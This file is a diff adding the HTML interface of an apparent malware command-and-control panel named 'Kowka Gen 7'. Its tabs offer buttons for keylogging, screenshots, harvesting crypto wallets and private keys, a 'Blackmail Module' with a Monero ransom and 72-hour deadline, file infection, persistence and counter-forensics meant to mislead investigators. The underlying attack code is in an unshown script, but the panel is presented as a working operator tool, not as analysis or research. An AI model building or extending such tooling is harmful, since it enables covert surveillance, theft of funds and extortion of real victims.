@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kowka Gen 7 - Command & Control</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Sidebar Navigation -->
+    <nav class="sidebar">
+        <div class="logo">
+            <i class="fas fa-paw"></i>
+            <span>Kowka Gen 7</span>
+        </div>
+        
+        <ul class="nav-links">
+            <li class="nav-item active" data-tab="dashboard">
+                <i class="fas fa-tachometer-alt"></i>
+                <span>Dashboard</span>
+            </li>
+            <li class="nav-item" data-tab="intelligence">
+                <i class="fas fa-brain"></i>
+                <span>Intelligence</span>
+            </li>
+            <li class="nav-item" data-tab="systems">
+                <i class="fas fa-cogs"></i>
+                <span>System Control</span>
+            </li>
+            <li class="nav-item" data-tab="financial">
+                <i class="fas fa-coins"></i>
+                <span>Financial Ops</span>
+            </li>
+            <li class="nav-item" data-tab="destruction">
+                <i class="fas fa-skull-crossbones"></i>
+                <span>Destruction</span>
+            </li>
+            <li class="nav-item" data-tab="terminal">
+                <i class="fas fa-terminal"></i>
+                <span>Terminal</span>
+            </li>
+        </ul>
+
+        <div class="system-status">
+            <div class="status-indicator online">
+                <i class="fas fa-circle"></i>
+                <span>Operational</span>
+            </div>
+            <div class="threat-level">
+                <span>Threat Level: </span>
+                <span class="level low">LOW</span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Dashboard Tab -->
+        <div id="dashboard" class="tab-content active">
+            <div class="header">
+                <h1>Operational Dashboard</h1>
+                <div class="controls">
+                    <button class="btn btn-primary" id="refreshStatus">
+                        <i class="fas fa-sync-alt"></i> Refresh
+                    </button>
+                </div>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-desktop"></i>
+                    </div>
+                    <div class="stat-info">
+                        <h3 id="activeSessions">0</h3>
+                        <p>Active Sessions</p>
+                    </div>
+                </div>
+
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-keyboard"></i>
+                    </div>
+                    <div class="stat-info">
+                        <h3 id="keystrokesCaptured">0</h3>
+                        <p>Keystrokes Captured</p>
+                    </div>
+                </div>
+
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-wallet"></i>
+                    </div>
+                    <div class="stat-info">
+                        <h3 id="cryptoWallets">0</h3>
+                        <p>Crypto Wallets Found</p>
+                    </div>
+                </div>
+
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div class="stat-info">
+                        <h3 id="threatLevel">0</h3>
+                        <p>Threat Level</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="charts-container">
+                <div class="chart-card">
+                    <h3>System Health</h3>
+                    <div class="health-metrics">
+                        <div class="metric">
+                            <label>Crypto System</label>
+                            <div class="progress-bar">
+                                <div class="progress-fill healthy" style="width: 95%"></div>
+                            </div>
+                        </div>
+                        <div class="metric">
+                            <label>Memory Engine</label>
+                            <div class="progress-bar">
+                                <div class="progress-fill healthy" style="width: 88%"></div>
+                            </div>
+                        </div>
+                        <div class="metric">
+                            <label>Persistence</label>
+                            <div class="progress-bar">
+                                <div class="progress-fill healthy" style="width: 92%"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="chart-card">
+                    <h3>Recent Activity</h3>
+                    <div class="activity-feed" id="activityFeed">
+                        <div class="activity-item">
+                            <i class="fas fa-keyboard success"></i>
+                            <div class="activity-content">
+                                <p>Keylogger started successfully</p>
+                                <small>2 minutes ago</small>
+                            </div>
+                        </div>
+                        <div class="activity-item">
+                            <i class="fas fa-screenshot warning"></i>
+                            <div class="activity-content">
+                                <p>Screenshot captured (High value context)</p>
+                                <small>5 minutes ago</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Intelligence Tab -->
+        <div id="intelligence" class="tab-content">
+            <div class="header">
+                <h1>Intelligence Gathering</h1>
+            </div>
+
+            <div class="command-grid">
+                <div class="command-card" data-command="/keylogger" data-params='{"action":"start"}'>
+                    <div class="command-icon">
+                        <i class="fas fa-keyboard"></i>
+                    </div>
+                    <h3>Start Keylogger</h3>
+                    <p>Begin AI-enhanced keylogging with context awareness</p>
+                    <button class="btn btn-primary">Execute</button>
+                </div>
+
+                <div class="command-card" data-command="/screenshot" data-params='{"mode":"smart","quality":85}'>
+                    <div class="command-icon">
+                        <i class="fas fa-camera"></i>
+                    </div>
+                    <h3>Capture Screenshot</h3>
+                    <p>Intelligent screenshot with context-based targeting</p>
+                    <button class="btn btn-primary">Execute</button>
+                </div>
+
+                <div class="command-card" data-command="/financial_intelligence" data-params='{"scan_type":"comprehensive"}'>
+                    <div class="command-icon">
+                        <i class="fas fa-search-dollar"></i>
+                    </div>
+                    <h3>Financial Scan</h3>
+                    <p>Comprehensive cryptocurrency and banking detection</p>
+                    <button class="btn btn-primary">Execute</button>
+                </div>
+
+                <div class="command-card" data-command="/system_intelligence" data-params='{"scope":"comprehensive"}'>
+                    <div class="command-icon">
+                        <i class="fas fa-desktop"></i>
+                    </div>
+                    <h3>System Profile</h3>
+                    <p>Complete system intelligence and security assessment</p>
+                    <button class="btn btn-primary">Execute</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- System Control Tab -->
+        <div id="systems" class="tab-content">
+            <div class="header">
+                <h1>System Control</h1>
+            </div>
+
+            <div class="command-grid">
+                <div class="command-card" data-command="/persistence" data-params='{"level":"maximum"}'>
+                    <div class="command-icon">
+                        <i class="fas fa-infinity"></i>
+                    </div>
+                    <h3>Establish Persistence</h3>
+                    <p>Deploy comprehensive cross-platform persistence</p>
+                    <button class="btn btn-warning">Execute</button>
+                </div>
+
+                <div class="command-card" data-command="/file_infect" data-params='{"type":"strategic"}'>
+                    <div class="command-icon">
+                        <i class="fas fa-virus"></i>
+                    </div>
+                    <h3>Strategic Infection</h3>
+                    <p>Infect strategic system files for maximum persistence</p>
+                    <button class="btn btn-warning">Execute</button>
+                </div>
+
+                <div class="command-card" data-command="/status" data-params='{"type":"comprehensive"}'>
+                    <div class="command-icon">
+                        <i class="fas fa-heartbeat"></i>
+                    </div>
+                    <h3>System Status</h3>
+                    <p>Comprehensive system health and operational status</p>
+                    <button class="btn btn-primary">Execute</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Financial Operations Tab -->
+        <div id="financial" class="tab-content">
+            <div class="header">
+                <h1>Financial Operations</h1>
+            </div>
+
+            <div class="command-grid">
+                <div class="command-card" data-command="/crypto_harvest" data-params='{"type":"wallets"}'>
+                    <div class="command-icon">
+                        <i class="fas fa-wallet"></i>
+                    </div>
+                    <h3>Harvest Crypto</h3>
+                    <p>Extract cryptocurrency wallets and private keys</p>
+                    <button class="btn btn-danger">Execute</button>
+                </div>
+
+                <div class="command-card" data-command="/BM" data-params='{"amount":{"xmr_amount":5,"usd_value":10000},"deadline":72}'>
+                    <div class="command-icon">
+                        <i class="fas fa-money-bill-wave"></i>
+                    </div>
+                    <h3>Blackmail Module</h3>
+                    <p>Initiate extortion protocol with payment tracking</p>
+                    <button class="btn btn-danger">Execute</button>
+                </div>
+
+                <div class="command-card" data-command="/financial_profiling" data-params='{"depth":"comprehensive"}'>
+                    <div class="command-icon">
+                        <i class="fas fa-chart-line"></i>
+                    </div>
+                    <h3>Financial Profile</h3>
+                    <p>Comprehensive target financial assessment</p>
+                    <button class="btn btn-warning">Execute</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Destruction Tab -->
+        <div id="destruction" class="tab-content">
+            <div class="header">
+                <h1>Destruction Protocols</h1>
+                <div class="warning-banner">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <span>DESTRUCTIVE OPERATIONS - IRREVERSIBLE</span>
+                </div>
+            </div>
+
+            <div class="command-grid">
+                <div class="command-card destructive" data-command="/emergency_cleanup" data-params='{"scope":"full"}'>
+                    <div class="command-icon">
+                        <i class="fas fa-broom"></i>
+                    </div>
+                    <h3>Emergency Cleanup</h3>
+                    <p>Remove all operational artifacts while preserving core</p>
+                    <button class="btn btn-warning">Execute</button>
+                </div>
+
+                <div class="command-card destructive" data-command="/counter_forensics" data-params='{"technique":"comprehensive"}'>
+                    <div class="command-icon">
+                        <i class="fas fa-user-secret"></i>
+                    </div>
+                    <h3>Counter Forensics</h3>
+                    <p>Active anti-forensic measures to mislead investigation</p>
+                    <button class="btn btn-warning">Execute</button>
+                </div>
+
+                <div class="command-card destructive" data-command="/self_destruct" data-params='{"confirmation":true}'>
+                    <div class="command-icon">
+                        <i class="fas fa-skull-crossbones"></i>
+                    </div>
+                    <h3>Zero-Trace Destruction</h3>
+                    <p>COMPLETE AND IRREVERSIBLE SELF-DESTRUCTION</p>
+                    <button class="btn btn-destructive" id="selfDestructBtn">EXECUTE</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Terminal Tab -->
+        <div id="terminal" class="tab-content">
+            <div class="header">
+                <h1>Raw Terminal</h1>
+                <div class="controls">
+                    <button class="btn btn-primary" id="clearTerminal">
+                        <i class="fas fa-trash"></i> Clear
+                    </button>
+                </div>
+            </div>
+
+            <div class="terminal-container">
+                <div class="terminal-output" id="terminalOutput">
+                    <div class="terminal-line">
+                        <span class="prompt">kowka@gen7:~$</span>
+                        <span class="command">system initialized</span>
+                    </div>
+                </div>
+                <div class="terminal-input">
+                    <span class="prompt">kowka@gen7:~$</span>
+                    <input type="text" id="terminalInput" placeholder="Type command...">
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Modals -->
+    <div id="confirmationModal" class="modal">
+        <div class="modal-content">
+            <h3>Confirm Command Execution</h3>
+            <p id="modalMessage">Are you sure you want to execute this command?</p>
+            <div class="modal-actions">
+                <button class="btn btn-secondary" id="modalCancel">Cancel</button>
+                <button class="btn btn-primary" id="modalConfirm">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
